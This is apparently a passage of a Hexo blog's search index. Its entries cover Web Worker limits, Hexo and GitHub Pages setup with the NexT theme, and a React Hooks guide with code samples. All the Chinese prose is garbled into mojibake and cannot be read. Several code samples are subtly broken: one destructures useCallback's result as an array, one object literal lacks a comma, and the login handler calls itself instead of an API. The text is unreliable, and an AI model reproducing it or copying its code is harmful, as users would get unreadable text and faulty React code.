setTimeoutæ—ç­‰æµè§ˆå™¨APIã€‚ é€šä¿¡é™åˆ¶ workerçº¿ç¨‹ä¸ä¸»çº¿ç¨‹ä¸åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œä¸èƒ½ç›´æ¥é€šä¿¡ï¼Œéœ€è¦é€šè¿‡ postMessageæ–¹æ³•æ¥é€šä¿¡ã€‚ è„šæœ¬é™åˆ¶ workerçº¿ç¨‹ä¸èƒ½æ‰§è¡Œ alertã€ confirmï¼Œä½†å¯ä»¥ä½¿ç”¨ XMLHttpRequest å¯¹è±¡å‘å‡ºajaxè¯·æ±‚ã€‚ æ¼«è°ˆå‰ç«¯æ€§èƒ½ çªç ´ React åº”ç”¨ç“¶é¢ˆ React ç»“åˆ Web worker ? å°è¯•åœ¨ Web worker ä¸­è¿è¡Œ React Virtual DOM çš„ç›¸å…³è®¡ç®—ï¼Œå³å°† React core éƒ¨åˆ†ç§»å…¥ Web worker çº¿ç¨‹ä¸­ ? è¿˜çœŸæœ‰äººæå‡ºç±»ä¼¼æƒ³æ³•ï¼š3092 issueï¼Œä½†æ˜¯ææ¡ˆè¢«æ‹’ç»äº†ï¼Œreact é€‰æ‹©çš„æ˜¯ React Fiberã€‚ ä½†æ˜¯è¿™ä¸ªå¹¶ä¸å¦¨ç¢ Web worker æˆä¸º â€œæ°‘é—´â€ çš„ react æ€§èƒ½è§£è¯ï¼š React Redux ä¸­é—´ä»¶æ€æƒ³é‡è§ Web Worker çš„çµæ„Ÿï¼ˆé™„demoï¼‰å¦å¤–ä¸¾ä¸ªä¾‹å­å¯¹æ¯”: http://web-perf.github.io/react-worker-dom/ å‚è€ƒæ–‡ç«  ç¡¬æ ¸JSã€ä¸€æ¬¡ææ‡‚JSè¿è¡Œæœºåˆ¶]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo & github page æ­å»ºåšå®¢]]></title>
    <url>%2F2019%2F08%2F17%2F%E5%85%B6%E4%BB%96%2Fhexo%20%26%20github%20page%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[æ­å»ºæ­å»ºè¿‡ç¨‹å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨ Hexo + Github Pages æ­å»ºä¸ªäººç‹¬ç«‹åšå®¢ Hexo ä¸»é¢˜é…ç½®å»ºè®®è®¾ç½®ä¸º next ä¸»é¢˜ å…‹éš†ä»“åº“ 12// git cloneå‘½ä»¤å°†Nextä»“åº“å…‹éš†åˆ°hexoç›®å½•ä¸‹çš„themes/nextgit clone https://github.com/theme-next/hexo-theme-next.git themes/next è®¾ç½® Next ä¸»é¢˜ 12345// åœ¨ç«™ç‚¹æ ¹ç›®å½•ä¸‹ï¼Œè®¾ç½®ä»¥ä¸‹ä»£ç ï¼š# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: hexo-theme-next #æ­¤å¤„å¡«å…¥ä½ åœ¨themesç›®å½•ä¸‹çš„nextä¸»é¢˜æ–‡ä»¶å ä¸ªæ€§åŒ–è®¾ç½®å¤§è‡´è®¾ç½®è¿‡ç¨‹å‚è§è¿™ç¯‡æ–‡ç« ï¼š Hexo æ­å»ºçš„ GitHub åšå®¢ä¹‹ä¼˜åŒ–å¤§å…¨ å¼€å¯æ–‡ç« é˜…è¯»æ¬¡æ•°åŠŸèƒ½ ç¬¬ä¸€ç§æ–¹æ³•ï¼šLeanCloud (å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://www.jianshu.com/p/702a7aec4d00) å» LeanCloud ï¼Œåˆ›å»ºæ–°åº”ç”¨ï¼Œåˆ›å»º Counter ç±» ä¿®æ”¹ä¸»é¢˜æ–‡ä»¶ 1234leancloud_visitors: enable: true #å°†åŸæ¥çš„falseæ”¹ä¸ºtrue app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt; ç¬¬äºŒç§æ–¹æ³•ï¼š å¼€å¯ä¸è’œå­ç»Ÿè®¡åŠŸèƒ½ åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­ _config.yml ï¼š 1234567891011121314# Show Views/Visitors of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: enable: true site_uv: true #total visitors site_uv_icon: #user-circle site_uv_header: ä½ æ˜¯æ¥è®¿çš„ç¬¬ site_uv_footer: ä½å°ä¼™ä¼´ site_pv: false #total views site_pv_icon: eye site_pv_header: è®¿é—®æ¬¡æ•°ï¼š site_pv_footer: æ¬¡ post_views: false post_views_icon: eye ä¸è¿‡å› ä¸ºåŸŸåè¿‡æœŸé—®é¢˜ï¼Œnext é»˜è®¤é›†æˆçš„ valine è„šæœ¬æ— æ³•è®¿é—®ï¼Œè§£å†³åŠæ³•å‚è§ï¼šhexo åšå®¢è§£å†³ä¸è’œå­ç»Ÿè®¡æ— æ³•æ˜¾ç¤ºé—®é¢˜ å¼€å¯ valine è¯„è®ºåŠŸèƒ½å¤§è‡´è®¾ç½®è¿‡ç¨‹å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š Hexo åšå®¢ä½¿ç”¨ valine è¯„è®ºç³»ç»Ÿæ— æ•ˆæœåŠç»ˆæè§£å†³æ–¹æ¡ˆ éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼š valine è¯„è®ºå’Œæ–‡ç« é˜…è¯»æ¬¡æ•°åŠŸèƒ½å‡åŸºäº LeanCloudï¼Œä¸¤è€…æœ‰å†²çªã€‚å¦‚æœæƒ³åŒæ—¶ä½¿ç”¨è¯„è®ºå’Œç»Ÿè®¡åŠŸèƒ½ï¼Œè§£å†³çš„åŠæ³•æ˜¯ï¼šåŸºäº LeanCloud å¼€å¯ valine è¯„è®ºï¼ŒåŸºäºä¸è’œå­å¼€å¯æ–‡ç« ç»Ÿè®¡åŠŸèƒ½ã€‚ å‚è€ƒæ–‡ç«  GitHub Pages æ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨ Hexo + Github Pages æ­å»ºä¸ªäººç‹¬ç«‹åšå®¢ Hexo æ­å»ºçš„ GitHub åšå®¢ä¹‹ä¼˜åŒ–å¤§å…¨ hexo åšå®¢è§£å†³ä¸è’œå­ç»Ÿè®¡æ— æ³•æ˜¾ç¤ºé—®é¢˜ Hexo åšå®¢ä½¿ç”¨ valine è¯„è®ºç³»ç»Ÿæ— æ•ˆæœåŠç»ˆæè§£å†³æ–¹æ¡ˆ]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebAssembly ä¼ é€é—¨]]></title>
    <url>%2F2019%2F08%2F15%2FWebAssembly%2FWebAssembly%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Webç«¯H.265æ’­æ”¾å™¨ç ”å‘è§£å¯†: https://mp.weixin.qq.com/s/ajLFM8q-4-2hxj-M_ChGdg]]></content>
      <categories>
        <category>WebAssembly</category>
      </categories>
      <tags>
        <tag>WebAssembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React Hooks æŒ‡å—]]></title>
    <url>%2F2019%2F08%2F15%2FWeb%E5%89%8D%E7%AB%AF%2FReact%20Hooks%20%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[WhatReact v16.7.0-alpha ä¸­ç¬¬ä¸€æ¬¡å¼•å…¥äº† Hooks çš„æ¦‚å¿µï¼Œåœ¨ v16.8.0 ç‰ˆæœ¬æ­£å¼å‘å¸ƒ React Hooks ï¼Œå…¶å¸¦æ¥çš„æœ€å¤§çš„å˜åŒ–åœ¨äºç»™äºˆäº†Function Component (å‡½æ•°å¼ç»„ä»¶)ç±»ä¼¼ç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„æ¦‚å¿µï¼Œæ‰©å¤§äº† Function Component çš„åº”ç”¨èŒƒå›´ã€‚ ç›®å‰ Function Component åŸºæœ¬å±äº dump ç»„ä»¶ï¼ŒHooks çš„å‡ºç°ä½¿å¾— Function Component æœ‰äº†è‡ªå·±çš„çŠ¶æ€ä¸ä¸šåŠ¡é€»è¾‘ï¼Œç®€å•é€»è¾‘åœ¨è‡ªå·±å†…éƒ¨å¤„ç†å³å¯ï¼Œä¸å†éœ€è¦é€šè¿‡ Props çš„ä¼ é€’ï¼Œä½¿ç®€å•é€»è¾‘ç»„ä»¶æŠ½ç¦»æ›´åŠ æ–¹ä¾¿ï¼Œä¹Ÿä½¿ä½¿ç”¨è€…æ— éœ€å…³å¿ƒç»„ä»¶å†…éƒ¨çš„é€»è¾‘ï¼Œåªå…³å¿ƒ Hooks ç»„ä»¶è¿”å›çš„ç»“æœå³å¯ã€‚ å®˜æ–¹æä¾›çš„ Hooksï¼š åŸºæœ¬ï¼šuseState ã€useEffect ã€ useContext é¢å¤–ï¼šuseCallback ã€ useReducer ã€ useMemo ã€ useRef ã€ useLayoutEffectã€ useImperativeHandle ã€ useDebugValue ä½¿ç”¨æ¡ä»¶ ä»…ä» React åŠŸèƒ½ç»„ä»¶è°ƒç”¨ hooksï¼Œä¸è¦ä»å¸¸è§„ js å‡½æ•°ä¸­è°ƒç”¨ hooksã€‚ åªèƒ½åœ¨é¡¶å±‚è°ƒç”¨ï¼Œä¸èƒ½åœ¨ for å¾ªç¯ã€if æ¡ä»¶åˆ¤æ–­ã€ *å‡½æ•°åµŒå¥— *ä¸­ä½¿ç”¨ã€‚ï¼ˆPsï¼šReact Hooks: ä¸æ˜¯é­”æ³•åªæ˜¯æ•°ç»„ ä¸€æ–‡ä¸­æœ‰è§£é‡Šä¸ºä»€ä¹ˆ hooks åªèƒ½åœ¨é¡¶å±‚è°ƒç”¨ã€‚ï¼‰ ç¯å¢ƒæ¡ä»¶1ã€å¿…é¡»å®Œæ•´é˜…è¯»ä¸€æ¬¡React Hookså®˜æ–¹æ–‡æ¡£è‹±æ–‡æ–‡æ¡£ï¼šhttps://reactjs.org/docs/hooks-intro.html ä¸­æ–‡æ–‡æ¡£ï¼šhttps://zh-hans.reactjs.org/docs/hooks-intro.html å…¶ä¸­é‡ç‚¹å¿…çœ‹hooks: useStateã€useReducerã€useEffectã€useCallbackã€useMemo å¦å¤–æ¨èé˜…è¯»ï¼š Dançš„ã€ŠuseEffectå®Œå…¨æŒ‡å—ã€‹ è¡è‰¯åŒå­¦çš„ã€ŠReact Hookså®Œå…¨ä¸Šæ‰‹æŒ‡å—ã€‹ 2ã€å·¥ç¨‹å¿…é¡»å¼•å…¥lintæ’ä»¶ï¼Œå¹¶å¼€å¯ç›¸åº”è§„åˆ™lintæ’ä»¶ï¼šhttps://www.npmjs.com/package/eslint-plugin-react-hooks å¿…å¼€è§„åˆ™ï¼š 1234567&#123; &quot;plugins&quot;: [&quot;react-hooks&quot;], &quot;rules&quot;: &#123; &quot;react-hooks/rules-of-hooks&quot;: &quot;error&quot;, &quot;react-hooks/exhaustive-deps&quot;: &quot;warn&quot; &#125;&#125; å…¶ä¸­ï¼Œ react-hooks/exhaustive-deps è‡³å°‘ warnï¼Œä¹Ÿå¯ä»¥æ˜¯errorã€‚å»ºè®®å…¨æ–°çš„å·¥ç¨‹ç›´æ¥é… â€œerrorâ€ï¼Œå†å²å·¥ç¨‹é… â€œwarnâ€ã€‚ åˆ‡è®°ï¼Œæœ¬æ¡æ˜¯ç¡¬æ€§æ¡ä»¶ã€‚å¦‚æœä½ çš„å·¥ç¨‹ï¼Œå½“å‰æ²¡å¼€å¯ hooks lint ruleï¼Œè¯·ä¸è¦ç¼–å†™ä»»ä½• hooks ä»£ç ã€‚ å¦‚æœå¯¹äºæŸäº›åœºæ™¯ï¼Œç¡®å®ä¸éœ€è¦ã€Œexhaustive-depsã€ï¼Œå¯åœ¨ä»£ç å¤„åŠ ï¼š 1// eslint-disable-next-line react-hooks/exhaustive-deps 3ã€å¦‚è‹¥æœ‰å‘ç°hooksç›¸å…³lintå¯¼è‡´çš„warningï¼Œä¸è¦å…¨å±€autofixé™¤äº†hookså¤–ï¼Œæ­£å¸¸çš„lintåŸºæœ¬ä¸ä¼šæ”¹å˜ä»£ç é€»è¾‘ï¼Œåªæ˜¯è°ƒæ•´ç¼–å†™è§„èŒƒã€‚ä½†æ˜¯hooksçš„lintè§„åˆ™ä¸åŒï¼Œ exhaustive-deps çš„å˜åŒ–ä¼šå¯¼è‡´ä»£ç é€»è¾‘å‘ç”Ÿå˜åŒ–ï¼Œè¿™æå®¹æ˜“å¼•å‘çº¿ä¸Šé—®é¢˜ï¼Œæ‰€ä»¥å¯¹äºhooksçš„waningï¼Œè¯·ä¸è¦åšå…¨å±€autofixæ“ä½œã€‚é™¤éä¿è¯æ¯å¤„é€»è¾‘éƒ½åšåˆ°äº†å……åˆ†å›å½’ã€‚ å¦å¤–å»ºè®®å¼€å¯vscodeçš„ã€Œautofix on saveã€ã€‚æœªæ¥æ— è®ºæ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œèƒ½æŠŠerrorä¸warning å°½é‡éåˆ¶åœ¨æœ€å¼€å§‹çš„å¼€å‘é˜¶æ®µï¼Œä¿è¯è‡ªæµ‹è·Ÿæµ‹è¯•æ—¶å°±æ˜¯ç¬¦åˆè§„åˆ™çš„ä»£ç  Why React Hooks ä¸»è¦è§£å†³ä»¥ä¸‹ä¸‰ä¸ªä¸»è¦çš„é—®é¢˜ï¼š ä»£ç é‡ç”¨ï¼šåœ¨ Hooks å‡ºæ¥ä¹‹å‰ï¼Œå¸¸è§çš„ä»£ç é‡ç”¨æ–¹å¼æ˜¯ HOC å’Œ render propsï¼Œè¿™ä¸¤ç§æ–¹å¼å¸¦æ¥çš„é—®é¢˜æ˜¯ï¼š ä½ éœ€è¦è§£æ„è‡ªå·±çš„ç»„ä»¶ï¼Œéå¸¸çš„ç¬¨é‡ï¼ŒåŒæ—¶ä¼šå¸¦æ¥å¾ˆæ·±çš„ç»„ä»¶åµŒå¥—ã€‚ éš¾ä»¥é‡ç”¨å’Œå…±äº«ç»„ä»¶ä¸­çš„ä¸çŠ¶æ€ç›¸å…³çš„é€»è¾‘ï¼Œé€ æˆäº§ç”Ÿå¾ˆå¤šå·¨å¤§çš„ç»„ä»¶ã€‚ å¤æ‚çš„ç»„ä»¶é€»è¾‘ï¼šåœ¨ class ç»„ä»¶ä¸­ï¼Œæœ‰è®¸å¤šçš„ lifecycle å‡½æ•°ï¼Œå½“æˆ‘ä»¬çš„ç»„ä»¶éœ€è¦å¤„ç†å¤šä¸ªäº’ä¸ç›¸å…³çš„ local state æ—¶ï¼Œæ¯ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸­å¯èƒ½ä¼šåŒ…å«ç€å„ç§äº’ä¸ç›¸å…³çš„é€»è¾‘åœ¨é‡Œé¢ï¼Œæœ€ç»ˆå¯¼è‡´é€»è¾‘å¤æ‚çš„ç»„ä»¶éš¾ä»¥å¼€å‘ä¸ç»´æŠ¤ã€‚ class ç»„ä»¶çš„å›°æƒ‘ï¼š å¤æ‚çš„æ¨¡å¼ï¼Œå¦‚æ¸²æŸ“é“å…·å’Œé«˜é˜¶ç»„ä»¶ã€‚ ç”±äºä¸šåŠ¡å˜åŠ¨ï¼Œå‡½æ•°ç»„ä»¶ä¸å¾—ä¸æ”¹ä¸ºç±»ç»„ä»¶ ä¸€ä¸ª React é¡¹ç›®ï¼Œæ˜¯ç”±æ— æ•°ä¸ªå¤§å¤§å°å°çš„ç»„ä»¶ç»„åˆè€Œæˆçš„ã€‚åœ¨ React çš„ä¸–ç•Œä¸­ï¼Œç»„ä»¶æ˜¯ä¸€ç­‰å…¬æ°‘ã€‚è€Œæˆ‘ä»¬å¹³æ—¶æ‹†åˆ†ç»„ä»¶çš„ä¾æ®æ— éæ˜¯ï¼šå°½é‡çš„å¤ç”¨ä»£ç ã€‚ç»„ä»¶æ˜¯UI + é€»è¾‘çš„å¤ç”¨ï¼Œä½†é€»è¾‘å¤ç”¨èƒ½åŠ›ç­‰äº 0ã€‚è™½ç„¶ React æä¾›äº† HOC ä¸ Render Props ä¸¤ç§æ–¹å¼æ¥è§£å†³é€»è¾‘å¤ç”¨çš„é—®é¢˜ï¼Œä½†ç”±äº renderProps åµŒå¥—é—®é¢˜ç­‰åŸå› ï¼Œè¿™ç§è§£æ³•å¹¶æ²¡æœ‰è®©é€»è¾‘å¤ç”¨æµè¡Œèµ·æ¥ã€‚ React Hooks å¾ˆå¥½çš„è§£å†³äº†é€»è¾‘å¤ç”¨çš„é—®é¢˜ï¼ŒåŒæ—¶è¿˜è§£å†³äº†çŠ¶æ€å…±äº«çš„é—®é¢˜ï¼Œæ˜¯ç»§ render-props å’Œ higher-order components ä¹‹åçš„ç¬¬ä¸‰ç§çŠ¶æ€å…±äº«æ–¹æ¡ˆï¼Œä¸”ä¸ä¼šäº§ç”Ÿ JSX åµŒå¥—åœ°ç‹±é—®é¢˜ã€‚ å¯¹äº Hooksã€Render Props å’Œé«˜é˜¶ç»„ä»¶æ¥è¯´ï¼Œå®ƒä»¬éƒ½æœ‰å„è‡ªçš„ä½¿ç”¨åœºæ™¯ï¼š Hooksï¼š æ›¿ä»£ Class çš„å¤§éƒ¨åˆ†ç”¨ä¾‹ï¼Œé™¤äº† getSnapshotBeforeUpdate å’Œ componentDidCatch è¿˜ä¸æ”¯æŒã€‚ æå–å¤ç”¨é€»è¾‘ã€‚é™¤äº†æœ‰æ˜ç¡®çˆ¶å­å…³ç³»çš„ï¼Œå…¶ä»–åœºæ™¯éƒ½å¯ä»¥ä½¿ç”¨ Hooksã€‚ Render Propsï¼šåœ¨ç»„ä»¶æ¸²æŸ“ä¸Šæ‹¥æœ‰æ›´é«˜çš„è‡ªç”±åº¦ï¼Œå¯ä»¥æ ¹æ®çˆ¶ç»„ä»¶æä¾›çš„æ•°æ®è¿›è¡ŒåŠ¨æ€æ¸²æŸ“ã€‚é€‚åˆæœ‰æ˜ç¡®çˆ¶å­å…³ç³»çš„åœºæ™¯ã€‚ é«˜é˜¶ç»„ä»¶ï¼šé€‚åˆç”¨æ¥åšæ³¨å…¥ï¼Œå¹¶ä¸”ç”Ÿæˆä¸€ä¸ªæ–°çš„å¯å¤ç”¨ç»„ä»¶ã€‚é€‚åˆç”¨æ¥å†™æ’ä»¶ã€‚ HowuseState useState(0) è¿”å›æ˜¯ä¸ªæ•°ç»„å½¢å¼ï¼ŒuseState(0) ä»£è¡¨ count çš„åˆå§‹å€¼æ˜¯ 0ï¼ŒuseState ç°é˜¶æ®µåªèƒ½ä¼ å…¥ä¸€ä¸ªåˆå§‹å€¼ã€‚useState ç±»ä¼¼ setStateï¼Œä½ å¯ä»¥çœ‹åšæ˜¯å¼‚æ­¥çš„ï¼Œä½† useState å¿…é¡»ä¿è¯æ‰§è¡Œé¡ºåºä¸€ä¸€è‡´ï¼ŒReact ä¸ºæ¯ä¸€æ¬¡çš„ useState è°ƒç”¨åˆ†é…ä¸€ä¸ªç©ºé—´ï¼Œé€šè¿‡ useState è°ƒç”¨é¡ºåºè¾¨åˆ«å„ä¸ªç©ºé—´ã€‚ 12345678910const Counter = () =&gt; &#123; const [count, setCount] = useState(0); const increment = () =&gt; setCount(count + 1); return ( &lt;&gt; &lt;h1&gt;&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;increment&#125;&gt;+&lt;/button&gt; &lt;/&gt; )&#125; useEffect å¦‚æœæˆ‘ä»¬éœ€è¦åœ¨ä¸€äº›ç‰¹å®šçš„ç”Ÿå‘½å‘¨æœŸæˆ–è€…å€¼å˜åŒ–ååšä¸€äº›æ“ä½œçš„è¯ï¼Œå¿…é¡»å€ŸåŠ© useEffect çš„ä¸€äº›ç‰¹æ€§å»å®ç°ã€‚ useState äº§ç”Ÿçš„ changeState æ–¹æ³•å¹¶æ²¡æœ‰æä¾›ç±»ä¼¼äº setState çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·çš„åŠŸèƒ½ï¼Œå› æ­¤å¦‚æœéœ€è¦åœ¨ State æ”¹å˜åæ‰§è¡Œä¸€äº›æ–¹æ³•ï¼Œå¿…é¡»é€šè¿‡ useEffect å®ç°ã€‚ useEffect çš„ä»£ç æ—¢ä¼šåœ¨åˆå§‹åŒ–æ—¶å€™æ‰§è¡Œï¼Œä¹Ÿä¼šåœ¨åç»­æ¯æ¬¡ rerender æ—¶æ‰§è¡Œï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‰¯ä½œç”¨éœ€è¦æ‰§è¡Œçš„å›è°ƒï¼Œç”Ÿæˆçš„å›è°ƒæ–¹æ³•å¯ä»¥è¿”å›ä¸€ä¸ªå‡½æ•°ï¼ˆå°†åœ¨ç»„ä»¶å¸è½½æ—¶è¿è¡Œï¼‰ï¼›ç¬¬äºŒä¸ªä¸ºè¯¥å‰¯ä½œç”¨ç›‘å¬çš„çŠ¶æ€æ•°ç»„ï¼Œå½“å¯¹åº”çŠ¶æ€å‘ç”Ÿå˜åŠ¨æ—¶ä¼šæ‰§è¡Œå‰¯ä½œç”¨ï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆåœ¨æ¯ä¸€ä¸ª State å˜åŒ–æ—¶éƒ½ä¼šæ‰§è¡Œè¯¥å‰¯ä½œç”¨ã€‚ ä½¿ç”¨ useEffect å®ç°ç±»ç»„ä»¶ä¸­ç”Ÿå‘½å‘¨æœŸï¼š useEffect å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ•°ç»„ä¸­çš„æˆå‘˜å˜é‡ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºä¸è¯¥å‰¯ä½œç”¨ç›¸å…³è”çš„çŠ¶æ€ä¸ºç©ºï¼Œä¸ç®¡å…¶ä»–çŠ¶æ€å¦‚ä½•å˜åŠ¨ï¼Œè¯¥å‰¯ä½œç”¨éƒ½ä¸ä¼šå†æ¬¡æ‰§è¡Œï¼Œå³å®ç°äº† effect åªä¼šåœ¨ç»„ä»¶ componentDidMount å’Œ componentWillUnmout æ—¶æœŸæ‰§è¡Œã€‚ 123useEffect(() =&gt; &#123; // æ¯æ¬¡componentDidMountä¼šè°ƒç”¨è¿™é‡Œ&#125;,[]) å¦‚æœéœ€è¦åœ¨ componentWillUnmount éœ€è¦æ‰§è¡Œä¸€äº›äº‹ä»¶ï¼Œå¯ä»¥ return è¿”å›æ—¶å€™è¿›è¡Œæ“ä½œã€‚ 123456useEffect(() =&gt; &#123; //åªæœ‰componentDidMountæ—¶å€™è°ƒç”¨è¿™é‡Œ return () =&gt; &#123; // componentWillUnmount &#125;;&#125;, []) useEffect æ¨¡æ‹Ÿ componentDidpdateï¼Œè¯¥ç”Ÿå‘½å‘¨æœŸåœ¨æ¯æ¬¡é¡µé¢æ›´æ–°åéƒ½ä¼šè¢«è°ƒç”¨ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨ useEffect å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œé‚£ä¹ˆåœ¨æ¯ä¸€ä¸ª State å˜åŒ–æ—¶éƒ½ä¼šæ‰§è¡Œè¯¥å‰¯ä½œç”¨çš„ç‰¹æ€§ã€‚ 12345678const mounted = useRef();useEffect(() =&gt; &#123; if(!mounted.current)&#123; mounted.current = true; &#125; else &#123; // æ‰§è¡Œ componentDidpdate &#125;&#125;) useLayoutEffectå¦‚æœå‰¯ä½œç”¨æ˜¯è·Ÿ DOM ç›¸å…³çš„ï¼Œéœ€è¦ä½¿ç”¨ useLayoutEffectã€‚useLayoutEffect ä¸­çš„å‰¯ä½œç”¨ä¼šåœ¨ DOM æ›´æ–°ä¹‹ååŒæ­¥æ‰§è¡Œã€‚ 1234567891011121314function App() &#123; const [width, setWidth] = useState(0); useLayoutEffect(() =&gt; &#123; const title = document.querySelector(&apos;#title&apos;); const titleWidth = title.getBoundingClientRect().width; if (width !== titleWidth) &#123; setWidth(titleWidth); &#125; &#125;); return &lt;div&gt; &lt;h1 id=&quot;title&quot;&gt;hello&lt;/h1&gt; &lt;h2&gt;&#123;width&#125;&lt;/h2&gt; &lt;/div&gt;&#125; useReduceruseReducer æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ reducer å‡½æ•°ï¼Œè·Ÿ redux ä¸­çš„ reducer æ˜¯ä¸€æ ·çš„ï¼›å¦å¤–ä¸€ä¸ªæ˜¯åˆå§‹çš„çŠ¶æ€å€¼ã€‚è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯çŠ¶æ€å€¼ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ dispatch å‡½æ•°ã€‚ 12345678910111213141516171819202122const reducer = (state, action) =&gt; &#123; switch(action.type) &#123; case &apos;increment&apos;: return &#123;count: state.count + 1&#125;; case &apos;decrement&apos;: return &#123;count: state.count - 1&#125;; case &apos;reset&apos;: return initState; default: return state; &#125;&#125;;function App() &#123; const [state, dispatch] = useReducer(reducer, initState); return &lt;div&gt; &lt;h1&gt;&#123;state.count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;increment&apos;&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;decrement&apos;&#125;)&#125;&gt;-&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;reset&apos;&#125;)&#125;&gt;reset&lt;/button&gt; &lt;/div&gt;&#125; useRefuseRefï¼šåœ¨å‡½æ•°ç»„ä»¶ä¸­è·å–ç»„ä»¶æˆ–DOMèŠ‚ç‚¹çš„å¼•ç”¨ã€‚ 12345678function App() &#123; const inputRef = useRef(null); return &lt;div&gt; &lt;input type=&quot;text&quot; ref=&#123;inputRef&#125;/&gt; &lt;button onClick=&#123;() =&gt; inputRef.current.focus()&#125;&gt;focus&lt;/button&gt; &lt;/div&gt;&#125; è¿˜å¯ä»¥ç”¨useRefæ¥ä¿å­˜ä¸€äº›å€¼çš„å¼•ç”¨ï¼Œå¹¶å¯¹å®ƒè¿›è¡Œè¯»å†™ã€‚ä¸¾ä¸ªä¾‹å­ï¼š 1234567891011121314151617const useValues = () =&gt; &#123; const [values, setValues] = useState(&#123;&#125;); const latestValues = useRef(values); useEffect(() =&gt; &#123; latestValues.current = values; &#125;); const [updateData] = useCallback((nextData) =&gt; &#123; setValues(&#123; data: nextData, count: latestValues.current.count + 1, &#125;); &#125;, []); return [values, updateData];&#125;; åœ¨ä½¿ç”¨ ref æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºå®ƒå¯ä»¥éšæ„èµ‹å€¼ï¼Œæ‰€ä»¥ä¸€å®šè¦æ§åˆ¶å¥½ä¿®æ”¹å®ƒçš„æ–¹æ³•ã€‚ç‰¹åˆ«æ˜¯ä¸€äº›åº•å±‚æ¨¡å—ï¼Œåœ¨å°è£…çš„æ—¶å€™åƒä¸‡ä¸è¦ç›´æ¥æš´éœ² refï¼Œè€Œæ˜¯æä¾›ä¸€äº›ä¿®æ”¹å®ƒçš„æ–¹æ³•ã€‚ useContextã€useReducerContext çš„ä½œç”¨å°±æ˜¯å¯¹å®ƒæ‰€åŒ…å«çš„ç»„ä»¶æ ‘æä¾›å…¨å±€å…±äº«æ•°æ®çš„ä¸€ç§æŠ€æœ¯ã€‚useReducer ç»“åˆ useContextï¼Œé€šè¿‡ context æŠŠ dispatch å‡½æ•°æä¾›ç»™ç»„ä»¶æ ‘ä¸­çš„æ‰€æœ‰ç»„ä»¶ä½¿ç”¨ ï¼Œè€Œä¸ç”¨é€šè¿‡ props æ·»åŠ å›è°ƒå‡½æ•°çš„æ–¹å¼ä¸€å±‚å±‚ä¼ é€’ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// å®šä¹‰åˆå§‹åŒ–å€¼const initState = &#123; name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, error: &apos;&apos;, isLoggedIn: false,&#125;// å®šä¹‰state[ä¸šåŠ¡]å¤„ç†é€»è¾‘ reducerå‡½æ•°function loginReducer(state, action) &#123; switch(action.type) &#123; case &apos;login&apos;: return &#123; ...state, isLoading: true, error: &apos;&apos;, &#125; case &apos;success&apos;: return &#123; ...state, isLoggedIn: true, isLoading: false, &#125; case &apos;error&apos;: return &#123; ...state, error: action.payload.error, name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, &#125; default: return state; &#125;&#125;// å®šä¹‰ contextå‡½æ•°const LoginContext = React.createContext();function LoginPage() &#123; const [state, dispatch] = useReducer(loginReducer, initState); const &#123; name, pwd, isLoading, error, isLoggedIn &#125; = state; const login = (event) =&gt; &#123; event.preventDefault(); dispatch(&#123; type: &apos;login&apos; &#125;); login(&#123; name, pwd &#125;) .then(() =&gt; &#123; dispatch(&#123; type: &apos;success&apos; &#125;); &#125;) .catch((error) =&gt; &#123; dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125;); &#125; // åˆ©ç”¨ context å…±äº«dispatch return ( &lt;LoginContext.Provider value=&#123;dispatch&#125;&gt; &lt;...&gt; &lt;LoginButton /&gt; 